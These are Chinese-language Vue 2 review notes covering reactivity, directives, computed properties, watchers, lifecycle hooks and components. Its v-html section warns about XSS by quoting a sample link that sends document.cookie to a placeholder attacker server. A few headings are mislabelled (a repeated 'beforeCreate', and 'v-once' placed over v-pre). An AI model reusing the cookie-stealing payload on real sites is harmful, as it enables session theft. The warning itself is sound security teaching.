# vue 全面复习

## vue 核心

### Vue 一级属性

$el：原生DOM结构，需要备份一份，原因是当diff算法算出来未改变时，需要直接拿原生dom，就是从$el 中拿

在 vm 上绑定的事件，即使 vm 被销毁了，原生事件也不会被移除。只有自定义事件会被移除。

### 概念

一旦 data 中的数据发生改变，那么页面中用到该数据的地方也会自动更新。注意，其核心和原理是 data 中的数据改变。
写代码时，一般是直接改变 vue 实例上的属性，整个过程是这样的。
vm.x = 2; vue 初始化时将 data 对象赋值给 vm.\_data。然后对 vm.\_data 进行数据代理。当访问 vm.x 时，利用 getter 从\_data 中拿，
然后 vm.x=2 赋值时，利用 setter 设置 vm.\_data.x 的值为 2。整个取值和设值的过程就是如此了。

vm.\_data 和 data 是全等的，说明他们的地址是同一个，但是 vm.\_data 在被赋值后对其上面的属性同样做了别的处理，就是同样设置了 getter 和 setter。当 setter 时重新渲染模板。

1.el 有 2 种写法
(1).new Vue 时候配置 el 属性。
(2).先创建 Vue 实例，随后再通过 vm.\$mount('#root')指定 el 的值。

### 指令

v-model 数据绑定：
双向绑定一般都应用在表单类元素上（如：input、select 等）
v-model:value 可以简写为 v-model，因为 v-model 默认收集的就是 value 值。

### MVVM 模型

```
		<!--
			MVVM模型
						1. M：模型(Model) ：data中的数据
						2. V：视图(View) ：模板代码
						3. VM：视图模型(ViewModel)：Vue实例
			观察发现：
						1.data中所有的属性，最后都出现在了vm身上。
						2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
		-->
```

M(model) 模型和 V(View)视图，vm 视图模型就是将两者进行一关联。主要是以模型驱动视图，而小部分情况比如 v-model 时，又是通过视图去更改模型。

### 数据代理

数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）
在 vue 中：通过 vm 对象来代理 data 对象中属性的操作（读/写），其作用是更加方便的操作 data 中的数据。
否则就要写 vm.\_data.x,每次都要这么写就不太方便。
基本原理：通过 Object.defineProperty()把 data 对象中所有属性添加到 vm 上。
为每一个添加到 vm 上的属性，都指定一个 getter/setter。
在 getter/setter 内部去操作（读/写）data 中对应的属性。

```
			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制属性是否可以枚举，默认值是false
				// writable:true, //控制属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false

				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
				get(){
					console.log('有人读取age属性了')
					return number
				},

				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}

			})
```

### 事件处理

#### Vue 中的事件修饰符：

1. prevent：阻止默认事件（常用） 对应 event.preventDefault()；
2. stop：阻止事件冒泡（常用） 对应 event.stopPropagation()；
3. once：事件只触发一次（常用）；
4. capture：使用事件的捕获模式，默认是冒泡模式；
5. self：只有 event.target 是当前操作的元素时才触发事件；
6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕；

watch 和 computed 都能实现时一般都用 computed，但是有时候不得不用 watch，比如说需要使用 oldValue，比如说需要使用深度监听等等。computed 还有一个限制就是 computed 的值完全依赖于 return 值，而有时候 return 值不好返回，比如说延迟输出，这种情况就不行了。

```
        computed:{
            test(){
                setTimeout(() => {
                   return 100
                }, 100);
            }
        }
```

#### 键盘事件

1.Vue 中常用的按键别名：
回车 => enter
删除 => delete (捕获“删除”和“退格”键)
退出 => esc
空格 => space
换行 => tab (特殊，必须配合 keydown 去使用)
上 => up
下 => down
左 => left
右 => right

2.Vue 未提供别名的按键，可以使用按键原始的 key 值去绑定，但注意要转为 kebab-case（短横线命名）

3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
(1).配合 keyup 使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
(2).配合 keydown 使用：正常触发事件。

4.也可以使用 keyCode 去指定具体的按键（不推荐）

5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名（不常用）

### 计算属性

原理：底层借助了 Objcet.defineproperty 方法提供的 getter 和 setter。
优点：与 methods 实现相比，内部有缓存机制（复用），效率更高，调试方便。
data 中的数据发生改变，模板就会被重新解析。如果模板中有方法，方法就一定会被重新调用，如果是 computed，只要依赖不改变，就会从缓存中取，而不是重新计算。

### 监视属性

监视的两种写法：
(1) new Vue 时传入 watch 配置
(2) 通过 vm.\$watch 监视

深度监视：
(1) Vue 中的 watch 默认不监测对象内部值的改变（一层）,Vue 自身可以监测对象内部值的改变，但 Vue 提供的 watch 默认不可以！。
(2) 配置 deep:true 可以监测对象内部值改变（多层）。

1. computed 能完成的功能，watch 都可以完成。
2. watch 能完成的功能，computed 不一定能完成，例如：watch 可以进行异步操作。其根本原因是因为 computed 完全依赖返回值，而有时候返回值没法立即得到。所以说原则就是能用 computed 就用 computed，computed 没法解决时或解决不优雅时考虑使用 watch。

两个推荐的小原则：

1. 所有被 Vue 管理的函数（例如声明周期函数，定义在 methods 里的函数等等），最好写成普通函数，这样 this 的指向才是 vm 或 组件实例对象。
2. 所有不被 Vue 所管理的函数（定时器的回调函数、ajax 的回调函数等、Promise 的回调函数），最好写成箭头函数，
   这样 this 的指向才是 vm 或 组件实例对象。

### style 和 class 绑定总结

1. class 样式
   :class="xxx" xxx 可以是字符串、对象、数组。

-   字符串写法适用于：类名不确定，要动态获取。
-   对象写法适用于： 要绑定多个样式，个数确定，名字也确定，但不确定用不用。
-   数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。

2. style 样式
   :style="{fontSize: xxx}"其中 xxx 是动态值。（常用）
   :style="[a,b]"其中 a、b 是样式对象。

# 可以使用 template 与 v-if 配合使用，减少 dom 结构，但注意不能和 v-show 一起使用。

当切换频率很高时，建议使用 v-show，提高效率。
使用 v-if 的时，元素可能无法获取到，而使用 v-show 一定可以获取到

### 列表渲染 （v-for 指令）

#### v-for 可遍历：数组（最常用）、对象、字符串（用的很少）、指定次数（用的很少）

#### 面试题：react、vue 中的 key 有什么作用？（key 的内部原理）

1.  虚拟 DOM 中 key 的作用：
    key 是虚拟 DOM 对象的标识，当数据发生变化时，Vue 会根据【新数据】生成【新的虚拟 DOM】,
    随后 Vue 进行【新虚拟 DOM】与【旧虚拟 DOM】的差异比较，比较规则如下：
2.  对比规则：
    (1).旧虚拟 DOM 中找到了与新虚拟 DOM 相同的 key：
    ①.若虚拟 DOM 中内容没变, 直接使用之前的真实 DOM！
    ②.若虚拟 DOM 中内容变了, 则生成新的真实 DOM，随后替换掉页面中之前的真实 DOM。

        (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
        	创建新的真实DOM，随后渲染到到页面。

3)  用 index 作为 key 可能会引发的问题： 1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
    会产生没有必要的真实 DOM 更新 ==> 界面效果没问题, 但效率低。

        2. 如果结构中还包含输入类的DOM：
            会产生错误DOM更新 ==> 界面有问题。

4)  开发中如何选择 key?: 1.最好使用每条数据的唯一标识作为 key, 比如 id、手机号、身份证号、学号等唯一值。 2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用 index 作为 key 是没有问题的。

#### 响应式原理

    		Vue监视数据的原理：
    			1. vue会监视data中所有层次的数据，就是对对象和数组进行了递归监听。

    			2. 如何监测对象中的数据？
    							通过setter实现监视，且要在new Vue时就传入要监测的数据，原因是初始化的数据vue才会做响应式处理。
    								(1).对象中后追加的属性，Vue默认不做响应式处理
    								(2).如需给后添加的属性做响应式，请使用如下API：
    												Vue.set(target，propertyName/index，value) 或
    												vm.$set(target，propertyName/index，value)

    			3. 如何监测数组中的数据？
                                    vue整理了能够引起数组变化的原生方法，然后重新封装了这些方法，一旦vue实例中的数据调用了这个方法，vue就能够检测到，重新解析模板，更新页面。
                                    所以vue修改数组必须调用如下方法：
    						            1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
    						            2.Vue.set() 或 vm.$set()

    			特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
                数据劫持：vm将data中定义的所有数据，进行了getter和setter。一旦你要去动data中的数据，必须先经过vm，vm是知晓的，这就叫劫持。

### 过滤器

过滤器本质上就是一个函数
过滤器相对来说比较鸡肋，不用完全没有问题，vue3 移除了 filter，全局的过滤器有些场景下还是会增加方便性。
定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
语法： 1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}} 2.使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = "xxx | 过滤器名"
备注： 1.过滤器也可以接收额外参数、多个过滤器也可以串联 2.并没有改变原本的数据, 是产生新的对应的数据

### 内置指令

#### v-model

    	<!--
    		收集表单数据：
    				若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
    				若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
    				若：<input type="checkbox"/>
    						1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    						2.配置input的value属性:
    								(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    								(2)v-model的初始值是数组，那么收集的的就是value组成的数组
    				备注：v-model的三个修饰符：
    								lazy：失去焦点再收集数据
    								number：输入字符串转为有效的数字
    								trim：输入首尾空格过滤
    	-->

#### v-html

    					1.作用：向指定节点中渲染包含html结构的内容。
    					2.与插值语法（或者v-text）的区别：
    								(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
    								(2).v-html可以识别html结构。
    					3.严重注意：v-html有安全性问题！！！！
    								(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
    								(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上，因为用户可能会写如下代码！
                                    <a href=javascript:location.href="坏人的服务器?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>
                                    一旦你将用户写的这个代码以v-html的形式插入，如果网站上有其他人点击了，就会造成cookie的全部泄露

#### v-cloak

v-cloak 指令（没有值）

1.  本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性。
2.  使用 css 配合 v-cloak 可以解决网速慢时页面展示出{{xxx}}的问题。

#### v-once

v-once 指令：

1. v-once 所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起 v-once 所在结构的更新，可以用于优化性能。

#### v-once

这玩意一般不会用，静态内容要是都加上 v-pre 有点麻烦
v-pre 指令：

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

### 自定义指令

可采用简写，将指令定义成一个函数，此时相当于只有声明周期 bind 和 update，合并了这两个钩子。
二、配置对象中常用的 3 个回调：
(1).bind：指令与元素成功绑定时调用。
(2).inserted：指令所在元素被插入页面时调用。
(3).update：指令所在模板结构被重新解析时调用。

三、备注：  
 1.指令定义时不加 v-，但使用时要加 v-；  
 2.指令名如果是多个单词，要使用 kebab-case 命名方式，不要用 camelCase 命名。

### 生命周期

1.又名：生命周期回调函数、生命周期函数、生命周期钩子。 2.是什么：Vue 在关键时刻帮我们调用的一些特殊名称的函数。 3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。 4.生命周期函数中的 this 指向是 vm 或 组件实例对象。

-   beforeCreate: 创建之前指的不是 vue 实例，vue 实例再次已经创建，应该说是数据监测和数据代理创建前。 初始化阶段，做的是一些 Vue 自身的初始化，比如生命周期函数注册，事件修饰符注册等等，但数据代理还未开始，即 data 中的数据还未挂到 vm 实例上。
-   create: 还是在初始化，这个初始化就和传入实例对象的参数有关了，数据监测和数据代理已经实现。可以通过 vue 实例访问定义的数据和方法。
-   beforeMount: 在 create 和 beforeMount 阶段，解析模板，生成虚拟 DOM，此时还保存在内存中，页面还不会显示解析好的内容。在此阶段如果你对 dom 进行任何操作，最终都会 Vue 在 mounted 阶段生成的真实 dom 覆盖。
-   mounted:

-   beforeCreate: 可以访问到数据和方法，但是对数据的改动不会触发视图更新了，原因是马上进入销毁程序，来不及更新了

        		常用的生命周期钩子：
        				1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
        				2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

        		关于销毁Vue实例
        				1.销毁后借助Vue开发者工具看不到任何信息。
        				2.销毁后自定义事件会失效，但原生DOM事件依然有效，通过vue绑定的@click并没有被清除。
        				3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

### 组件

一、如何定义一个组件？
使用 Vue.extend(options)创建，其中 options 和 new Vue(options)时传入的那个 optio 样，但也有点区别；
区别如下：
1.el 不要写，为什么？ ——— 最终所有的组件都要经过一个 vm 的管理，由 vm 中的 el 个容器。
2.data 必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
备注：使用 template 可以配置组件结构。

#### Vue.extend

Vue.extend 是可以省略的，也就是说在注册时，你可以直接丢一个对象给 components 属性，如下所示，这种形式实际是 Vue 底层帮你调用了 Vue.extend。也就是所传入 components 的数据，Vue 会做判断，如果判断是一个未调用过 Vue.extend 的对象，就自动帮你调用一下 Vue.extend。 Vue.extend 的返回值是一个 VueComponent 的构造函数。
这里又要说下了，为啥 Vue.extend 返回一个构造函数，原因是组件这个对象并不是在注册时生成，而是在页面上或者其他地方被调用时生成，调用时 VueComponent 返回的构造函数创造出一个组件实例。

```
components:{
	template:`
		<div>
			<h2>学生姓名：{{studentName}}</h2>
			<h2>学生年龄：{{age}}</h2>
		</div>`,
	data(){
		return {
			studentName:'张三',
				age:18
			}
		},
}
```

#### 几个注意点：

1.关于组件名:
多个单词组成：
第一种写法(kebab-case 命名)：my-school
第二种写法(CamelCase 命名)：MySchool (需要 Vue 脚手架支持)
备注：
(1).组件名尽可能回避 HTML 中已有的元素名称，例如：h2、H2 都不行。
(2).可以使用 name 配置项指定组件在开发者工具中呈现的名字。

2.关于组件标签:
第一种写法：<school></school>
第二种写法：<school/>
备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

3.一个简写方式：
const school = Vue.extend(options) 可简写为：const school = options

### VueComponent：

    1.子组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

    2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
    即Vue帮我们执行的：new VueComponent(options)。

    3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

    4.关于this指向：
    	(1).组件配置中：
    		data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
    	(2).new Vue(options)配置中：
    		data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

    5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
    	Vue的实例对象，以后简称vm。


    			1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
    			也就是说vc的原型的原型 就是 vm的原型，即Vue。这样设计vc就可以访问Vue上的属性和方法
    			2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

## 脚手架

关于不同版本的 Vue：
1.vue.js 与 vue.runtime.xxx.js 的区别：
(1).vue.js 是完整版的 Vue，包含：核心功能+模板解析器。
(2).vue.runtime.xxx.js 是运行版的 Vue，只包含：核心功能；没有模板解析器，所以组件选项中无法写 template。开发环境下，我们使用的就是 vue.runtime.esm.js，只能使用 render 函数渲染，所谓 esm 就是 es6 的 module 模块。

    	2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用
    		render函数接收到的createElement函数去指定具体内容。
